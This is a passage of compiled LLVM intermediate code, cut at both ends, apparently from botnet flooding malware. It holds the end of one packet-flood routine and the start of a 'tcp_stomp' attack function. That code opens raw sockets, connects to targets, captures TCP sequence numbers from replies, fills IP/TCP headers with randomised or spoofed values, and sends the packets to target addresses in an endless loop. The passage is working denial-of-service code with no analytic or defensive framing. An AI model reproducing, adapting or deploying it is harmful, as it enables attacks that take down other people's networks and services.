  %262 = and i32 %261, 65535
  %263 = trunc i32 %262 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 5
  store i16 %263, i16* %265, align 2
  %266 = load i8, i8* %22, align 1
  %267 = icmp ne i8 %266, 0
  br i1 %267, label %268, label %274

; <label>:268:                                    ; preds = %174
  %269 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = and i16 %271, -2049
  %273 = or i16 %272, 2048
  store i16 %273, i16* %270, align 4
  br label %274

; <label>:274:                                    ; preds = %268, %174
  %275 = load i8*, i8** %31, align 8
  %276 = load i32, i32* %26, align 4
  call void @rand_str(i8* %275, i32 %276)
  br label %277

; <label>:277:                                    ; preds = %274
  %278 = load i32, i32* %9, align 4
  %279 = add nsw i32 %278, 1
  store i32 %279, i32* %9, align 4
  br label %118

; <label>:280:                                    ; preds = %118
  br label %281

; <label>:281:                                    ; preds = %439, %280
  store i32 0, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %436, %281
  %283 = load i32, i32* %9, align 4
  %284 = load i8, i8* %5, align 1
  %285 = zext i8 %284 to i32
  %286 = icmp slt i32 %283, %285
  br i1 %286, label %287, label %439

; <label>:287:                                    ; preds = %282
  %288 = load i8**, i8*** %11, align 8
  %289 = load i32, i32* %9, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds i8*, i8** %288, i64 %290
  %292 = load i8*, i8** %291, align 8
  store i8* %292, i8** %32, align 8
  %293 = load i8*, i8** %32, align 8
  %294 = bitcast i8* %293 to %struct.iphdr*
  store %struct.iphdr* %294, %struct.iphdr** %33, align 8
  %295 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i64 1
  %297 = bitcast %struct.iphdr* %296 to %struct.tcphdr*
  store %struct.tcphdr* %297, %struct.tcphdr** %34, align 8
  %298 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i64 1
  %300 = bitcast %struct.tcphdr* %299 to i8*
  store i8* %300, i8** %35, align 8
  %301 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i32 0, i32 2
  %306 = load i8, i8* %305, align 4
  %307 = zext i8 %306 to i32
  %308 = icmp slt i32 %307, 32
  br i1 %308, label %309, label %330

; <label>:309:                                    ; preds = %287
  %310 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 1
  %315 = load i32, i32* %314, align 4
  %316 = call i32 @ntohl(i32 %315) #7
  %317 = call i32 @rand_next()
  %318 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %319 = load i32, i32* %9, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i64 %320
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i32 0, i32 2
  %323 = load i8, i8* %322, align 4
  %324 = zext i8 %323 to i32
  %325 = lshr i32 %317, %324
  %326 = add i32 %316, %325
  %327 = call i32 @htonl(i32 %326) #7
  %328 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 9
  store i32 %327, i32* %329, align 4
  br label %330

; <label>:330:                                    ; preds = %309, %287
  %331 = load i32, i32* %28, align 4
  %332 = icmp eq i32 %331, -1
  br i1 %332, label %333, label %337

; <label>:333:                                    ; preds = %330
  %334 = call i32 @rand_next()
  %335 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 8
  store i32 %334, i32* %336, align 4
  br label %337

; <label>:337:                                    ; preds = %333, %330
  %338 = load i16, i16* %13, align 2
  %339 = zext i16 %338 to i32
  %340 = icmp eq i32 %339, 65535
  br i1 %340, label %341, label %347

; <label>:341:                                    ; preds = %337
  %342 = call i32 @rand_next()
  %343 = and i32 %342, 65535
  %344 = trunc i32 %343 to i16
  %345 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 3
  store i16 %344, i16* %346, align 4
  br label %347

; <label>:347:                                    ; preds = %341, %337
  %348 = load i16, i16* %16, align 2
  %349 = zext i16 %348 to i32
  %350 = icmp eq i32 %349, 65535
  br i1 %350, label %351, label %357

; <label>:351:                                    ; preds = %347
  %352 = call i32 @rand_next()
  %353 = and i32 %352, 65535
  %354 = trunc i32 %353 to i16
  %355 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %356 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %355, i32 0, i32 0
  store i16 %354, i16* %356, align 4
  br label %357

; <label>:357:                                    ; preds = %351, %347
  %358 = load i16, i16* %17, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  br i1 %360, label %361, label %367

; <label>:361:                                    ; preds = %357
  %362 = call i32 @rand_next()
  %363 = and i32 %362, 65535
  %364 = trunc i32 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 1
  store i16 %364, i16* %366, align 2
  br label %367

; <label>:367:                                    ; preds = %361, %357
  %368 = load i32, i32* %18, align 4
  %369 = icmp eq i32 %368, 65535
  br i1 %369, label %370, label %374

; <label>:370:                                    ; preds = %367
  %371 = call i32 @rand_next()
  %372 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %373 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %372, i32 0, i32 2
  store i32 %371, i32* %373, align 4
  br label %374

; <label>:374:                                    ; preds = %370, %367
  %375 = load i32, i32* %19, align 4
  %376 = icmp eq i32 %375, 65535
  br i1 %376, label %377, label %381

; <label>:377:                                    ; preds = %374
  %378 = call i32 @rand_next()
  %379 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 3
  store i32 %378, i32* %380, align 4
  br label %381

; <label>:381:                                    ; preds = %377, %374
  %382 = load i8, i8* %27, align 1
  %383 = icmp ne i8 %382, 0
  br i1 %383, label %384, label %387

; <label>:384:                                    ; preds = %381
  %385 = load i8*, i8** %35, align 8
  %386 = load i32, i32* %26, align 4
  call void @rand_str(i8* %385, i32 %386)
  br label %387

; <label>:387:                                    ; preds = %384, %381
  %388 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 7
  store i16 0, i16* %389, align 2
  %390 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %391 = bitcast %struct.iphdr* %390 to i16*
  %392 = call zeroext i16 @checksum_generic(i16* %391, i32 20)
  %393 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 7
  store i16 %392, i16* %394, align 2
  %395 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 6
  store i16 0, i16* %396, align 4
  %397 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %398 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %399 = bitcast %struct.tcphdr* %398 to i8*
  %400 = load i32, i32* %26, align 4
  %401 = sext i32 %400 to i64
  %402 = add i64 20, %401
  %403 = trunc i64 %402 to i16
  %404 = call zeroext i16 @htons(i16 zeroext %403) #7
  %405 = load i32, i32* %26, align 4
  %406 = sext i32 %405 to i64
  %407 = add i64 20, %406
  %408 = trunc i64 %407 to i32
  %409 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %397, i8* %399, i16 zeroext %404, i32 %408)
  %410 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 6
  store i16 %409, i16* %411, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 1
  %414 = load i16, i16* %413, align 2
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 1
  store i16 %414, i16* %420, align 2
  %421 = load i32, i32* %10, align 4
  %422 = load i8*, i8** %32, align 8
  %423 = load i32, i32* %26, align 4
  %424 = sext i32 %423 to i64
  %425 = add i64 40, %424
  %426 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %427 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %428 = load i32, i32* %9, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i64 %429
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i32 0, i32 0
  %432 = bitcast %struct.sockaddr_in* %431 to %struct.sockaddr*
  store %struct.sockaddr* %432, %struct.sockaddr** %426, align 8
  %433 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %434 = load %struct.sockaddr*, %struct.sockaddr** %433, align 8
  %435 = call i64 @sendto(i32 %421, i8* %422, i64 %425, i32 16384, %struct.sockaddr* %434, i32 16)
  br label %436

; <label>:436:                                    ; preds = %387
  %437 = load i32, i32* %9, align 4
  %438 = add nsw i32 %437, 1
  store i32 %438, i32* %9, align 4
  br label %282

; <label>:439:                                    ; preds = %282
  br label %281

; <label>:440:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %607

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %607

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %492, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %495

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %487, %476, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %492

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = or i32 %128, 2048
  %130 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %129)
  %131 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %131, align 4
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 2
  %137 = load i8, i8* %136, align 4
  %138 = zext i8 %137 to i32
  %139 = icmp slt i32 %138, 32
  br i1 %139, label %140, label %161

; <label>:140:                                    ; preds = %125
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 1
  %146 = load i32, i32* %145, align 4
  %147 = call i32 @ntohl(i32 %146) #7
  %148 = call i32 @rand_next()
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = lshr i32 %148, %155
  %157 = add i32 %147, %156
  %158 = call i32 @htonl(i32 %157) #7
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %160 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %159, i32 0, i32 0
  store i32 %158, i32* %160, align 4
  br label %170

; <label>:161:                                    ; preds = %125
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %169 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %168, i32 0, i32 0
  store i32 %167, i32* %169, align 4
  br label %170

; <label>:170:                                    ; preds = %161, %140
  %171 = load i16, i16* %17, align 2
  %172 = zext i16 %171 to i32
  %173 = icmp eq i32 %172, 65535
  br i1 %173, label %174, label %179

; <label>:174:                                    ; preds = %170
  %175 = call i32 @rand_next()
  %176 = and i32 %175, 65535
  %177 = trunc i32 %176 to i16
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %177, i16* %178, align 2
  br label %183

; <label>:179:                                    ; preds = %170
  %180 = load i16, i16* %17, align 2
  %181 = call zeroext i16 @htons(i16 zeroext %180) #7
  %182 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %181, i16* %182, align 2
  br label %183

; <label>:183:                                    ; preds = %179, %174
  %184 = load i32, i32* %26, align 4
  %185 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %186 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %186, %struct.sockaddr** %185, align 8
  %187 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %188 = load %struct.sockaddr*, %struct.sockaddr** %187, align 8
  %189 = call i32 @connect(i32 %184, %struct.sockaddr* %188, i32 16)
  %190 = call i64 @time(i64* null) #6
  store i64 %190, i64* %31, align 8
  br label %191

; <label>:191:                                    ; preds = %490, %183
  store i32 16, i32* %29, align 4
  %192 = load i32, i32* %10, align 4
  %193 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %194 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %195 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %195, %struct.sockaddr** %194, align 8
  %196 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %197 = load %struct.sockaddr*, %struct.sockaddr** %196, align 8
  %198 = call i64 @recvfrom(i32 %192, i8* %193, i64 256, i32 16384, %struct.sockaddr* %197, i32* %29)
  %199 = trunc i64 %198 to i32
  store i32 %199, i32* %33, align 4
  %200 = load i32, i32* %33, align 4
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %202, label %203

; <label>:202:                                    ; preds = %191
  br label %607

; <label>:203:                                    ; preds = %191
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %205 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 4
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %208 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 4
  %210 = icmp eq i32 %206, %209
  br i1 %210, label %211, label %482

; <label>:211:                                    ; preds = %203
  %212 = load i32, i32* %33, align 4
  %213 = sext i32 %212 to i64
  %214 = icmp ugt i64 %213, 40
  br i1 %214, label %215, label %482

; <label>:215:                                    ; preds = %211
  %216 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %217 = getelementptr inbounds i8, i8* %216, i64 20
  %218 = bitcast i8* %217 to %struct.tcphdr*
  store %struct.tcphdr* %218, %struct.tcphdr** %35, align 8
  %219 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 0
  %221 = load i16, i16* %220, align 4
  %222 = zext i16 %221 to i32
  %223 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %224 = load i16, i16* %223, align 2
  %225 = zext i16 %224 to i32
  %226 = icmp eq i32 %222, %225
  br i1 %226, label %227, label %481

; <label>:227:                                    ; preds = %215
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = lshr i16 %230, 9
  %232 = and i16 %231, 1
  %233 = zext i16 %232 to i32
  %234 = icmp ne i32 %233, 0
  br i1 %234, label %235, label %460

; <label>:235:                                    ; preds = %227
  %236 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = lshr i16 %238, 12
  %240 = and i16 %239, 1
  %241 = zext i16 %240 to i32
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %460

; <label>:243:                                    ; preds = %235
  %244 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %245 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 4
  %247 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %248 = load i32, i32* %9, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %250, i32 0, i32 0
  store i32 %246, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 2
  %254 = load i32, i32* %253, align 4
  %255 = call i32 @ntohl(i32 %254) #7
  %256 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %259, i32 0, i32 1
  store i32 %255, i32* %260, align 4
  %261 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 3
  %263 = load i32, i32* %262, align 4
  %264 = call i32 @ntohl(i32 %263) #7
  %265 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %266 = load i32, i32* %9, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %265, i64 %267
  %269 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %268, i32 0, i32 2
  store i32 %264, i32* %269, align 4
  %270 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 1
  %272 = load i16, i16* %271, align 2
  %273 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %274 = load i32, i32* %9, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %276, i32 0, i32 3
  store i16 %272, i16* %277, align 4
  %278 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %279 = load i16, i16* %278, align 2
  %280 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %281 = load i32, i32* %9, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i64 %282
  %284 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %283, i32 0, i32 4
  store i16 %279, i16* %284, align 2
  %285 = load i32, i32* %24, align 4
  %286 = sext i32 %285 to i64
  %287 = add i64 40, %286
  %288 = call noalias i8* @malloc(i64 %287) #6
  %289 = load i8**, i8*** %12, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i8*, i8** %289, i64 %291
  store i8* %288, i8** %292, align 8
  %293 = load i8**, i8*** %12, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8*, i8** %293, i64 %295
  %297 = load i8*, i8** %296, align 8
  %298 = bitcast i8* %297 to %struct.iphdr*
  store %struct.iphdr* %298, %struct.iphdr** %36, align 8
  %299 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i64 1
  %301 = bitcast %struct.iphdr* %300 to %struct.tcphdr*
  store %struct.tcphdr* %301, %struct.tcphdr** %37, align 8
  %302 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i64 1
  %304 = bitcast %struct.tcphdr* %303 to i8*
  store i8* %304, i8** %38, align 8
  %305 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %306 = bitcast %struct.iphdr* %305 to i8*
  %307 = load i8, i8* %306, align 4
  %308 = and i8 %307, 15
  %309 = or i8 %308, 64
  store i8 %309, i8* %306, align 4
